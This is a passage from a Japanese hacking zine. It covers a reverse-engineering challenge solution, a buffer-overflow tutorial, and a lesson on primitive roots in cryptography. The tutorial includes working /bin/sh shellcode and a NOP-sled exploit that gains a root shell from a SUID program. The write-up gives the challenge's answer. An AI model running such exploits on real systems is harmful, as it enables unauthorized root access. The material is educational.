+00401211   . |870424        XCHG DWORD PTR SS:[ESP],EAX
+00401214   . |874424 04     XCHG DWORD PTR SS:[ESP+4],EAX
+00401218   . |3B0424        CMP EAX,DWORD PTR SS:[ESP]     ; チェックポイント2のチェック
+0040121B   . |58            POP EAX
+0040121C   . |58            POP EAX
+0040121D   . |0F85 AE000000 JNZ FSC_Leve.004012D1          ; チェックポイント2の分岐点
+-----
+
+　実は、チェックポイント2も仮の引数を与えた現状のままで通過できてしまいま
+す。というのも、ここは4011E7-4011F1の処理を除けば、チェックポイント1の処
+理とほぼ同様であり、6文字前が「"(22)」であるかどうかをチェックしているだ
+けだからです。
+
+　ただ、4011E9-4011ECを見てください。EDX-4、つまり4文字前から4文字分（＝
+引数「abcd」）を5528566DでXORしています。実は、これがチェックポイント3の
+比較文字になるのです。
+
+
+■0x10.) チェックポイント3
+
+-----　チェックポイント3の前の処理
+0040121D   . /0F85 AE000000 JNZ FSC_Leve.004012D1          ; チェックポイント2
+00401223   . |54            PUSH ESP
+00401224   . |890424        MOV DWORD PTR SS:[ESP],EAX
+00401227   . |8B42 F6       MOV EAX,DWORD PTR DS:[EDX-A]   ; 注意点1
+0040122A   . |870424        XCHG DWORD PTR SS:[ESP],EAX
+0040122D   . |54            PUSH ESP
+0040122E   . |890424        MOV DWORD PTR SS:[ESP],EAX
+00401231   . |89C0          MOV EAX,EAX
+00401233   . |870424        XCHG DWORD PTR SS:[ESP],EAX
+00401236   . |874424 04     XCHG DWORD PTR SS:[ESP+4],EAX
+0040123A   . |3B0424        CMP EAX,DWORD PTR SS:[ESP]     ; チェックポイント3のチェック
+0040123D   . |58            POP EAX
+0040123E   . |58            POP EAX
+0040123F   . |0F85 B7000000 JNZ FSC_Leve.004012FC          ; チェックポイント3の分岐
+-----
+
+　401227でEDX-A、つまり10文字前の文字列を4文字分取得しています。10文字前
+は「.exe」になります。また、40123Aでは、前項の引数を5528566DでXORしたもの
+と「.exe(6578652E)」と比較しています。ということは以下の条件を満たせばよ
+いわけです。
+
+引数 XOR 5528566D = 6578652E(.exe)
+
+　一方でXORは以下のような法則が成り立ちます。
+
+    X XOR Y = Z
+    X XOR Z = Y
+    Z XOR Y = X
+
+　ということは、以下の式も成り立つということです。
+
+6578652E XOR 5528566D = 引数
+
+　一点注意しなければならないのは、この式はリトルエンディアンを考慮してい
+ません。よって、正確には以下の結果を求めることになります。
+
+2E657865 XOR 6D562855 = 引数
+
+　これは、Windowsに付属の電卓で計算できますので、それで計算を行なってくだ
+さい。43335030という値になりました。これをASCIIコードに直すと「C3P0」にな
+ります。これが引数の正確な値になります。
+
+
+■0x11.) 正しい引数をつけて実行
+
+　では、正しい引数に直して実行してみましょう。もうデバッガでロードしなく
+てもかまいません。実行すると、以下のポップアップが表示されるはずです。
+
+-----　表示されたポップアップの内容
+Assembly 2007 Reverse-Engineering Challenge - Level 2
+Copyright (c) 2007 F-Secure Corporation
+
+
+Congratulations!
+Please send an e-mail to LuckyNumberIs_30503343_FSC@khallenge.com
+-----
+
+　このメールアドレスに送ったところ、レベル3へのリンクが貼られたメールが戻
+ってきました。
+
+
+■0x07.) 所感
+
+　Level2は、Level1から比べると急にレベルが上がったように思います。とはい
+っても、コード自体が非常に小さいので、私のような初心者にはうってつけの練
+習台でした。Level3はさらに難しくなります。次回は、そのあたりを説明したい
+と思います。
+
+　まだまだ上級者の方が見たら、私のやり方は非常に効率が悪く、取るに足らな
+いやり方かもしれませんが、暖かく見守っていただけると幸いです。また、アド
+バイスがございましたら、ぜひとも賜りたいと思います。よろしくお願いします。
+
+　それでは、また。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第6章: はじめてのハッキング ～バッファオーバフローの利用～ ---
+
+著者：Defolos
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　前回までで、ハッキングの土台となる前提知識を確認し終えました。今回はこ
+れまで確認してきたピースを寄せ集め、実際にバッファオーバフローの脆弱性を
+利用して侵入を試みます。今回の記事を通して、本レポートの主題である「侵入
+」という過程を一通り学んだことになります。
+
+
+■0x02.) バッファオーバフロー
+
+　侵入につながる脆弱性にはいくつかの種類がありますが、今回はとりわけ有名
+かつ致命的な脆弱性であるバッファオーバフローを利用します。
+
+●バッファオーバフローとは
+
+　バッファオーバフロー（Buffer Overflow）は古くから存在の知られる、プログ
+ラム言語の仕様とハードウェアメモリの使われ方の脆弱性をうまく利用したハッ
+キングテクニックです。バッファオーバフローには主に2つの分類があります。ひ
+とつはスタックセグメント上に確保されたバッファを攻撃するスタックバッファ
+オーバフローです。もうひとつはヒープセグメント上に確保されたバッファを攻
+撃するヒープバッファオーバフローです。
+　バッファオーバフローの存在は非常に古くから知られていた脆弱性ですが、そ
+の脆弱性がroot権限の奪取に利用できることは1996年に発行されたwebマガジンP
+hrackで初めて公になりました。しかしながら、このようなwebマガジンにテクニ
+ックが紹介されるのはハッカーがテクニックを使って遊び尽くした後のことでし
+ょうから、実際にはより以前からバッファオーバフローのテクニックが悪用され
+ていたことでしょう。
+
+●プログラムの落とし穴
+
+　プログラムではバッファ（変数や配列など）を確保し、そのバッファに必要な
+データを一時的に溜め込んで処理を行うことが当然のように行われています。し
+かし、この過程でバッファに格納するデータのサイズをチェックし忘れると、ro
+ot権限を奪取されかねない危険なプログラムが完成してしまいます。特に、プロ
+グラミング言語として大きなシェアをもつC言語では、言語の仕様上バッファオー
+バフローの脆弱性が生まれやすいようになっています。そのため、世間に出回っ
+ているほとんどのプログラムにはバッファオーバフローの脆弱性がひとつぐらい
+は存在しています。
+
+○バッファオーバフローの原理
+
+　バッファというのはデータを一時的に保存する領域であることは先程述べまし
+た。これは例えばファイルから読み込んだデータを一時的に置いておいたり、キ
+ーボードからの入力を貯めておくための領域です。バッファはメモリに確保され
+ますが、リスト構造以外のデータ構造をバッファに利用した場合、バッファの大
+きさは20バイトや256バイトのように有限です。
+　通常、ユーザの名前などを入力させるような場合には20バイトほどのバッファ
+を配列で確保します。次の図のようにメモリにバッファが確保されます。
+
+0  1  2  3  4  5  6  7  8  9  10 11 12 13 14 15 16 17 18 19 20 21 22
++--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+|  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |
++--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+←***********************入力バッファ*********************→
+
+　上の図では0バイト目から20バイト目までを入力バッファとして確保しましたが、
+もしここで21バイトの文字列、例えば「abcdefghijklmnopqrstu」という文字列を
+バッファに入力したとするとどうなるでしょう。確保したバッファは20バイトで
+すので、「t」までしかバッファに入りません。残の1バイト「u」はどこに行って
+しまうのでしょうか。
+　実は、メモリには次の図のように文字列がコピーされ、残の1バイトは入力バッ
+ファに隣接するメモリに上書きされます。
+
+0  1  2  3  4  5  6  7  8  9  10 11 12 13 14 15 16 17 18 19 20 21 22
++--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+|a |b |c |d |e |f |g |h |i |j |k |l |m |n |o |p |q |r |s |t |u |  |
++--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+←***********************入力バッファ*********************→
+
+　「u」が格納されているメモリ領域は、何に使われている領域かは分かりません。
+場合によっては他の変数が確保し、データの保持に使っていた領域かも知れませ
+ん。下図の例では、入力バッファに隣接するように変数Aの領域がメモリ上に確保
+されています。そのうえで、変数Aには30という値が格納されています。図で4つ
+の升目を取っているのは、変数Aを4バイトであるとしたためです。
+
+14 15 16 17 18 19 20 21 22 23 24 25 26 27
++--+--+--+--+--+--+--+--+--+--+--+--+--+
+|  |  |  |  |  |  |     30    |  |  |  |
++--+--+--+--+--+--+--+--+--+--+--+--+--+
+**入力バッファ**→←**変数A*→
+
+　ここに、先程と同じように21文字のデータを入力します。すると、20バイトの
+入力バッファに収まりきらなかった1文字が、隣接する変数Aのためのメモリ領域
+を侵犯します。
+
+14 15 16 17 18 19 20 21 22 23 24 25 26 27
++--+--+--+--+--+--+--+--+--+--+--+--+--+
+|o |p |q |r |s |t |u          |  |  |  |
++--+--+--+--+--+--+--+--+--+--+--+--+--+
+**入力バッファ**→←**変数A*→
+
+　このように、変数Aの中身を書き換えてしまいます。変数Aが書き換えられた後
+に、変数Aを使ってなんらかの処理をしようとすると、予期せぬ動作を引き起こす
+ことになるでしょう。これが、バッファオーバフローの脆弱性です。
+
+○C言語とバッファオーバフローの関係
+
+　C言語で書かれたプログラムには、バッファオーバフローの脆弱性が含まれるこ
+とが多いです。というのも、C言語はバッファのサイズチェックを自動では行って
+くれず、プログラマがチェックを行わなければならない仕様だからです。例えば、
+Strcpy関数は指定されたバッファの内容を指定したバッファにコピーしますが、
+コピー先のバッファが十分に大きいかどうかはプログラマがチェックしなければ
+なりません。下のサンプルコードでは、7行目のif文でサイズのチェックを行って
+います。
+
+-----
+int main(int argc, char *argv[]){
+
+    char str1[7] = "Hello!";
+    char str2[5];
+
+    //このif文でサイズチェックを行う
+    if(sizeof(str1) <= sizeof(str2)){
+        strcpy(str2, str1);
+    }
+    return 0;
+}
+-----
+
+　このチェックを怠ってしまうと、バッファオーバフローの脆弱性がプログラム
+内に混入してしまいます。C言語の、特に文字列操作関数にはstrcpy関数以外にも、
+get関数などのサイズチェックを行わない関数が多数存在しています。ゆえに、C
+言語で書かれたプログラムには、プログラマの怠慢や無知のためにバッファオー
+バフローの脆弱性が含まれていることが多いのです。
+
+●C言語でのサンプル
+
+　より具体的に、バッファオーバフローの脆弱性が問題となるプログラムの例を
+示します。下のサンプルコードはゲームのコードの一部ですが、これには重大な
+脆弱性が存在しています。ゲームにおいてスコアというのは最も重要視される変
+数です。しかし、このコードではスコアを自由に書き換えることができてしまい
+ます。
+
+-----
+#include <stdio.h>
+
+int main(int argc, char *argv[]){
+
+    int  starge;
+    int  score;
+    char name[12];
+
+    starge = 1;
+    score = 0;
+
+    //game routine
+
+    printf("Please input your name.\n");
+    gets(name);
+    printf("Score of %s is %d!!\n", name, score);
+
+    return 0;
+}
+-----
+
+　これをコンパイルし実行すると、次のようにユーザ名をキーボードから入力さ
+れるのを待ち受けるようになります。これはゲームでハイスコアを出した時のユ
+ーザ名登録を想定しています。
+
+-----
+Defolos@glazheim:~$ ./a.exe
+Please input your name.
+Defolos
+Score of Defolos is 0!!
+-----
+
+　ユーザ名が入力されると、score変数に格納されているスコアを表示します。本
+来はゲームルーチンでスコアが加算されていくのですが、このサンプルではゲー
+ムルーチンは省略しているので、スコアは初期値の0のままです。
+　ではここに、ユーザ名格納用の配列サイズ以上の文字列を入力したとするとど
+うなるでしょう。例えば25文字の文字列を名前として入力したとします。
+
+-----
+Defolos@glazheim:~$ ./a.exe
+Please input your name.
+aaaaaaaaaaaaaaaaaaaaaaaaa
+Score of aaaaaaaaaaaaaaaaaaaaaaaaa is 97!!
+-----
+
+　本来0であるはずのスコアが、バッファオーバフローのために書き換えられて97
+になっています。メモリ内は図1のように、高位アドレスから12バイトのname配列、
+12バイトの無割当て領域、int型(4バイト)のscore変数というように割当てられま
+す。「a」はASCIIコード表で01100001で表されるため、10進数に直すと97となり
+ます。25バイト目からscore変数が始まっているため、24文字のどうでもいい文字
+列を格納した後、4バイトでスコアを構成すれば、ほぼ任意の数値にスコアを書き
+換えることができます。
+
+（図1）http://ruffnex.oc.to/defolos/text1/figure/ladder.png
+
+　このようにバッファオーバフローの脆弱性は、プログラムの重要なデータを任
+意に書き換える余地を与えてしまいます。この例では任意のプログラムの実行と
+いう最悪のケースは示されていませんが、バッファオーバフローをうまく利用す
+れば、シェル起動プログラムはおろか、どのようなプログラムでも実行すること
+が可能なのです。
+
+
+■0x03.) 侵入
+
+　システムへの侵入とは、コントロール権を得ることだと述べました。そして、
+そのコントロール権はroot権限を持った状態でシェルを起動することで得られ、
+さらに、SUID rootプログラムの流れを途中で変えてシェルを起動できれば、コン
+トロール権を得られることが分かりました。
+　後は、いかにしてプログラムの実行の流れを変えるかです。最後のピースはバ
+ッファオーバフローをうまく応用することで実現します。ここではその応用例を
+見て行くことにしましょう。
+
+●バッファオーバフローの応用
+
+　バッファオーバフローは、隣接する下位番地のメモリ内を上書きできることは
+前述の通りです。ここで、関数呼び出しの仕組みについて思い出してください。
+関数呼び出しの際には戻り値がメモリ上に確保され、関数の終了時にその戻り値
+を参照します。つまり、戻り値をバッファオーバフローで上書きできれば任意の
+メモリ番地に制御を移すことができます。
+
+●サンプル
+
+　次のプログラムは、バッファオーバフローによって関数の戻り値を書き換え、
+main関数終了時に0x41414141番地に制御を移します。
+
+-----
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char *argv[]){
+
+    char buffer[8];
+    strcpy(buffer, "AAAAAAAAAAAAAAAA");
+    return 0;
+}
+-----
+
+　このプログラムをコンパイルし、実行すると次のようにセグメンテーションフ
+ォルトが発生します。
+
+-----
+defolos@glazheim:~$ ./a.out
+セグメンテーション違反です
+-----
+
+　これは、main関数の戻り先としてメモリ内に保存されていた、EIPの保存領域
+(SEIP:Saved EIP)がバッファオーバフローによって上書きされたため、main関数
+終了時にSEIPに保存されているアドレスへ制御を移そうとした結果です。今回は
+SEIPをAAAA(=0x41414141)に書き換えたので、mainから戻る時はメモリの0x41414
+141番地を実行しようとします。しかし、0x41414141番地には実行可能な機械語デ
+ータが格納されてはおらず、機械語命令には無いビットパターンが構成されてい
+ます。故にCPUは0x41414141番地のビットパターンを実行できず、苦肉の策のエラ
+ー処理としてセグメンテーションフォルトを発生させます。しかし、もし実行可
+能なビットパターンが構成されている番地にSEIPを書き換えることができれば、
+その命令を実行することになるのです。
+
+　このように、SEIP領域を書き換えることによって、関数終了時に任意の場所に
+制御を移すことができます。これを応用し、プログラムのバッファ内に制御を移
+し、そこに実行可能な機械語をデータとして格納すれば、どのようなプログラム
+でも実行することができます。
+
+●権限奪取実証のイメージ
+
+　SEIP領域の書き換えによって、プログラムの流れを自由に変えることができる
+とわかりました。これをうまく使い、システムのコントロール権をいただく（＝
+侵入）ことを実証してみましょう。
+　第一章で述べたように、侵入とはコントロール権の奪取であり、コントロール
+権は管理者としてシェルを起動することで得られます。さらに、実行時には誰が
+実行したかにかかわらず管理者権限で実行されるSUID rootプログラムの存在を示
+し、そのプログラムの途中でシェルを起動できればコントロール権を得られると
+説明しました。プログラムの流れの変え方を学んだ今、侵入に必要なすべてのパ
+ーツがそろったと言えます。
+
+　イメージとしては、SUID rootプログラムのバッファにシェルコードを入れ、そ
+の先頭アドレスを、関数の戻り地が保存されたアドレスにバッファオーバフロー
+を用いて上書きします。
+
+         buffer                 sfp    seip
+--------+----------------------+-----+--------------------+-------
+        | shellcode            |     | address of buffer  |
+--------+----------------------+-----+--------------------+-------
+        ↑                              |
+         +------------------------------+
+
+　これで、関数の終了時にretに格納されたアドレス、つまりbufferの先頭であり
+shellcodeの先頭に制御が移ります。その結果、root権限でシェルが起動し権限を
+奪うことができます。
+　このイメージには、ひとつ問題点が有ります。私達はメモリの内容をリアルタ
+イムにモニタリングするすべを持っていませんので、bufferの先頭番地が何番な
+のか正確にはわからないのです。大まかな場所は予測できても、1バイトもズレず
+にbufferの先頭番地を予測するのはあてずっぽうでは限界があります。shellcod
+eを実行するには、１バイトの前後も許されません。shellcodeの先頭ぴったりの
+アドレスをSEIP領域に書き込まなければなりませんが、これは不可能に近いこと
+です。この問題は、実証イメージの具現化にあたって、あるテクニックを使って
+解決します。
+
+●コントロール権奪取の実証
+
+　実証のイメージを具現化したものが次のコードです。このコードはコマンドラ
+イン引き数の文字列をbufferにコピーするだけのプログラムです。bufferの容量
+が500バイトと固定されているので、500バイト以上の文字列を引き数として渡せ
+ばバッファオーバフローが発生します。
+
+-----
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char *argv[]){
+
+    char buffer[500];
+    strcpy(buffer, argv[1]);
+    return 0;
+}
+-----
+
+　コンパイル時に名前を「bo-test.exe」にします。その後、SUID rootプログラ
+ムにするために所有権をrootに変更し、SUIDビットを起てておきます。このプロ
+グラムの入力値として、次のプログラムで生成した文字列を渡します。
+
+-----
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+char shellcode[]=
+"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0"
+"\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d"
+"\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73"
+"\x68";
+
+unsigned long sp (void){
+    __asm__("movl %esp, %eax");
+}
+
+int main (int argc, char *argv[]){
+
+    int i, offset;
+    long esp, ret, *addr_ptr;
+    char *buffer, *ptr;
+
+    offset = 1000;
+    esp = sp();
+    ret = esp - offset;
+
+    printf("sp = 0x%x\n", esp);
+    printf("ret= 0x%x\n", ret);
+
+    buffer = malloc(600);
+
+    ptr = buffer;
+    addr_ptr = (long *)ptr;
+
+    for (i=0; i<600; i += 4){
+        *(addr_ptr++) = ret;
+    }
+
+    for (i=0; i<200; i++){
+        buffer[i] = '\x90';
+    }
+
+    ptr = buffer + 200;
+
+    for (i=0; i<strlen(shellcode); i++){
+        *(ptr++) = shellcode[i];
+    }
+
+    buffer[600 - 1] = 0;
+
+    execl("./bo-test.exe", "bo-test.exe", buffer, 0);
+
+    free(buffer);
+    return 0;
+}
+-----
+
+　この文字列生成プログラムを実行すると、プログラム内で構成したbuffer配列
+を引き数としてbo-test.exeを実行します。このソースをexploit.exeとしてコン
+パイルし、実行すると結果は次のように、root権限でシェルを起動する結果とな
+ります。
+
+-----
+defolos@glazheim:~$ exploit.exe
+sp = 0xbffff908
+ret= 0xbffff520
+sh-2.05b#
+-----
+
+　ここで注目すべきは、bo-test.exeに渡された文字列です。文字列生成プログラ
+ムで600バイトの文字列を生成しているため、バッファオーバフローが発生します。
+その結果SEIP領域がretに書き換えられるわけです。
+
+0                   200              246          600
++--------------------+----------------+------------+
+|  NOP               | shellcode      |  ret       |
++--------------------+----------------+------------+
+
+○NOP
+
+　NOPはNo Operationの略で、何もしない命令です。何も行わずに次のアドレスに
+ある命令を実行するだけの命令で、一見すると利用価値がないようにも見えます。
+機械語では0x90に翻訳されます。
+　今回は、このNOPが重要なテクニックとして利用されています。NOPは何もせず
+に次の命令を実行しますので、NOPの連発の後に実行可能なプログラムを置いてお
+けば、どのNOPから処理を始めても最終的にプログラムの先頭にたどり着くのです。
+
+NOP                                 program
++----------------------------------+----------------------+
+| nop nop nop ...                  | executable program   |
++----------------------------------+----------------------+
+実行→→→→→→→→→→→→→→→→
+
+　このテクニックはNOPスレッドと呼ばれ、プログラムの先頭アドレスを完全には
+予測できない場合に多用されるテクニックです。retにNOPスレッドのうちのどれ
+かを指定すればプログラムの先頭にたどり着くので、実行したいプログラムを実
+行できる可能性が高まります。
+
+○シェルコード
+
+　シェルコードはeggとも呼ばれ、シェルを起動する小さなプログラムです。第一
+章で紹介したシェルを起動するプログラムを機械語に変換したもので、その制作
+にはアセンブリ言語が使われます。詳細は省きますが、シェルを起動するプログ
+ラムを機械語に翻訳したものだと覚えておいてください。このコードを実行する
+のが今回の検証の目的です。
+
+○RET
+
+　RETは関数の戻り値として上書きする、ジャンプ先のアドレスです。今回は文字
+列生成プログラムで構成したNOPのうちのどれかを指し示すようにします。
+　もちろん、あてずっぽうにアドレスを指定しても当たる可能性は低く、実用的
+ではありません。そこで、文字列生成プログラムが実行された時のスタックポイ
+ンタを予測の足掛かりとします。このスタックポインタにオフセットを減算する
+ことでretとして指定すべきアドレスを作ります。今回の例では、適当に1,000バ
+イトをオフセットとして利用しました。オフセットの値は試行錯誤して捜し出す
+ことになります。
+
+low memory 0x08000000
++---------------+ .text
+|               |
++---------------+ .data
+|               |
++---------------+ .heap
+| nop           |
++               +
+|               |
++---------------+
+| shellcode     |
++---------------+
+|               |
++ ret           +
+|               |
++---------------+
+
++---------------+bo-test.exe main()
+|               |　　stackpointer-1064
++   buffer      |
+|               |
++---------------+
+|   SFP         |
++---------------+
+|   RET         |
++---------------+
+|   argc(2)     |
++---------------+
+|  *argv(buffer)|
++---------------+
+|  *argv(name)  |
++---------------+
+
+544バイトのすきま
+
++---------------+ ←stackpointer exploit.exe main()
+|    i          |
++---------------+
+|    offset     |
++---------------+
+|    esp        |
++---------------+
+|    ret        |
++---------------+
+|    addr_ptr   |
++---------------+
+|    *buffer    |
++---------------+
+|    *ptr       |
++---------------+
+|   SFP         |
++---------------+
+|   RET         |
++---------------+
+|   argc        |
++---------------+
+|   argv        |
++---------------+
+heigh memory (0xbfffffff)
+
+　正確には1,064バイトのオフセットを取ると、bo-test.exe上に確保されたbufer
+の先頭に制御が移ります。オフセットを1,064に変更して実行すると次のようにな
+ります。
+
+-----
+defolos@glazheim:~$ exploit.exe
+sp = 0xbffff908
+ret= 0xbffff4e0
+sh-2.05b#
+-----
+
+　ここからNOPスレッドの長さ（200バイト）分だけオフセットの位置を減らして
+も大丈夫です。0xbffff4e0に200を加算すると0xbfff5a8ですが、0xbfff5a8はちょ
+うどシェルコードの先頭に位置するアドレスですので、シェルコードがうまく起
+動します。
+
+-----
+defolos@glazheim:~$ exploit.exe
+sp = 0xbffff908
+ret= 0xbffff5a8
+sh-2.05b#
+-----
+
+　しかし、もしここから1バイトでもオフセットの値を減らしてしまうと、シェル
+コードの途中から実行が開始されることになり、おかしな命令として解釈されて
+しまいます。
+
+-----
+defolos@glazheim:~$ exploit.exe
+sp = 0xbffff908
+ret= 0xbffff5a9
+不正な命令です
+-----
+
+　まとめると、retのアドレスとして0xbffff4e0から0xbffff5a8の間のアドレスを
+指定すれば、NOPスレッドに制御が移りシェルコードを実行することができます。
+　このretのアドレスも、ひとつだけではSEIP領域を上書きできないかもしれない
+ため、立続けに300バイト程用意します。このうちのひとつがSEIP領域を書き換え
+ればよいのです。
+
+　この実証で確認できたように、バッファオーバフローによってSEIP領域を書き
+換え、アタッカーが用意したシェルを起動するプログラムへ制御を移せば侵入が
+可能です。多くのドキュメントで曖昧に言及される「侵入」という過程は、この
+ようにプログラミング言語の仕様上の脆弱性を利用することであると言えます。
+
+
+■0x04.) おわりに
+
+　今回はバッファオーバフローの脆弱性の利用という切り口から、侵入と呼ばれ
+る過程の具体的な実例を見てきました。
+　次回は、今回すでに用意してあるものとして取り扱ったシェルコードについて
+言及します。シェルコードを自らの力で開発できる応用力は、様々なシステムを
+攻略できることに直結します。
+　それでは、またお会いしましょう。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第7章: 基礎暗号学講座・第11回 ～原始元判定アルゴリズム～ ---
+
+著者：IPUSIRON
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　今回も前回に引き続き、暗号の実装においてよく使われるアルゴリズムを紹介
+する。今回紹介するアルゴリズムは原始元判定アルゴリズムである。素数判定ア
+ルゴリズムから比べれば地味だが、暗号の実装においては重要なアルゴリズムである。
+
+　すでに原始元の概念は解説済みだが、復習として定義から入りたいと思う。
+
+
+■0x02.) 原始元
+
+　法p（素数）の世界で考えたとき、その世界には{0,1,…,p-1}（これをZ_pと表
+記する）のp個の数が存在する。このとき、0を除いた{1,…,p-1}（これはちょう
+どZ_p^*と一致している）の中で、p-1乗したとき初めて1になるような元のことを
+原始元という。
+
+　例えば、p=5とすると、Z_5^*={1,2,3,4}の世界には4つの数がある。それぞれの
+数において、何乗したら1に一致するか確かめてみる（1になったらストップさせ
+ている）。
+
+・1^1=1
+・2^1=2、2^2=4、2^3=8≡3 mod 5、2^4=6≡1 mod 5
+・3^1=3、3^2=9≡4 mod 5、3^3=12≡2 mod 5、3^4=6≡1 mod 5
+・4^1=4、4^2=16≡1 mod 5
+
+　1は1乗で1に一致してしまうので、原始元ではない。2と3は4乗（=p-1=5-1）で
+初めて1になったので、原始元である。4は2乗で1に一致してしまうので、原始元
+ではない。よって、Z_5^*の原始元は2と3ということになる。
+
+
+*原始元と元の位数の関係
+
+　元の位数とはa^x≡1 (mod p)となる最小の正整数xのことであり、aの位数とい
+う。これはx=ord_p(a)と表される。
+
+　上記の例の結果をord表記で表すと、次のようになる。
+
+・ord_5(1)=1
+・ord_5(2)=4
+・ord_5(3)=4
+・ord_5(4)=2
+
+　この表記で原始元を定義するとord_p(a)=p-1のときであるから、p=5のときは
+ord_5(a)=4を満たすようなaが原始元である。つまり、a=2,3が原始元とわかる。
+
+　a∈{1,2,3,4}のときのord_5(a)の値に注目して欲しい。aが1から4まで変化する
+と、ord_5(a)の値は1,4,4,2となる。この4つの値はすべて4（=p-1=5-1）の約数に
+なっている。この事実に気付くには数値をもう少し大きくして考えなければなら
+ないが、ここでは天下り式に次の数学的事実があることを示す。
+
+[定理]
+pは素数とする。
+このとき、aの位数d（=ord_p(a)）は、p-1の約数である。
+即ち、d|p-1が成り立つ。
+
+
+■0x03.) 原始元の個数
+
+　pが具体的に決まると集合Z_p^*も具体的に決まってくる。すると、その集合に
+含まれている原始元も決まってくる。ここで気になるのが、このpと原始元の個数
+には関係があるのではないかということである。実際には関係があるのである。
+Z_5^*の例では、元1～4についていちいち累乗して調べてから、個数を求めていた。
+しかし、pの値と原始元の個数に関係があるので、実はそのようなやり方をしなく
+ても簡単に求める方法があるのである。ただし、あくまで原始元の個数であって、
+どの元が原始元かということについてではないことに注意してもらいたい。
+　それではpの値と原始元の個数の関係の定理を次に示す。
+
+[定理]
+Z_p^*の原始元の個数はφ(p-1)個である。
+
+　φ( )はオイラー関数である。オイラー関数φ(n)とは、nと互いに素である正の
+整数の個数を意味する。
+
+　この結果はものすごい興味深く感じるかもしれない。Z_n^*で考えると興味深さ
+が増すと思う。まず、Z_n^*の要素の個数はφ(n)である（定義から明らか）。さ
+らに、φ(n)の中で原始元の数はφ(φ(n))個になる。φが2重になっていることに
+対してエレガント性を感じてしまう。
+
+　以上のことから、原始元は全体の数から見ても、比較的たくさんあることがわ
+かる。例えば、p=7で考えれば、原始元の個数は次のように計算できて2個になる。
+つまり、Z_7^*の中に原始元は2個存在することになる。
+
+φ(7-1)=φ(6)=φ(2・3)=φ(2)φ(3)=(2-1)(3-1)=1・2=2
+
+　φ(n)はnによって異なる値になるが、平均すると6n/π^2（≒0.6）という事実が
+ある。よって、φ(φ(n))は平均すると約0.36ということになる。つまり、全体の
+36%が原始元と考えることができる。
+
+
+■0x04.) 原始元の累乗で構成される集合
+
+　暗号理論に密接な関係にある、原始元に関する数学的事実がある。それは、原
+始元gを選び、それを0乗～p-2乗して作られた数の集合{g^0=1,g^1 (mod p),g^2 
+(mod p),…,g_(p-2) (mod p)}は、Z_p^*={1,2,…,p-1}と一致するということであ
+る。
+
+　この事実の恩恵がどう嬉しいのかについては、今後の記事において暗号プロト
+コルが登場したときに説明したいと思う。
+
+　ここでは、この数学的事実に慣れてもらうために、先ほどの例と同様にp=5で考
+えてみる。p=5のときのZ_5、Z_5^*、Z_5^*の原始元はすでに上記の例で解説済み
+である。その結果を次にまとめておく。
+
+・p=5
+・Z_5={0,1,2,3,4}
+・Z_5^*={1,2,3,4}
+・原始元g=2,3（∈Z_5^*）
+
+[1]g=2のとき
+
+・g^0=2^0=1
+・g^1=2^1=2
+・g^2=2^2=4
+・g^3=2^3=8≡3 (mod 5)
+
+　よって、{g^0 mod 5,g^1 mod 5,g^2 mod 5,g^3 mod 5}={1,2,4,3}={1,2,3,4}と
+なり、Z_5^*と一致している。
+
+[2]g=3のとき
+
+・g^0=3^0=1
+・g^1=3^1=3
+・g^2=3^2=9≡4 (mod 5)
+・g^3=3^3=12≡2 (mod 5)
+
+　よって、{g^0 mod 5,g^1 mod 5,g^2 mod 5,g^3 mod 5}={1,3,4,2}={1,2,3,4}と
+なり、Z_5^*と一致している。
+
+　したがって、いずれにしても、gの値がいずれにしても定理が必ず成立すること
+が確かめられた。
+
+
+■0x05.) 原始元の生成アルゴリズム
+
+　暗号の世界では原始元が活躍する。そのためコンピュータで効率的に原始元を
+生成する必要が生じる。例えば、ElGamal暗号などにおいては、大きな素数pに対
+して、Z_p^*の原始元gを生成する必要がある。
+
+　原始元を生成する素朴なアプローチは全数探索である。まず、g∈Z_p^*をラン
+ダムに選択肢、次にそれが原始元かどうかを判定すればよい。原始元の定義から、
+g≠1,g^2≠1,…,g^{p-2}≠1 (mod p)が成り立てば、gは原始元である（∵原始元
+の定義より、g^{p-1}が法pの世界で初めて1になるgが、原始元であるから）。し
+かし、この方法ではp^κの計算量がかかってしまう（κ：ビット数）。指数時間
+の計算量ではチューリングマシンにとって効率的ではない。
+
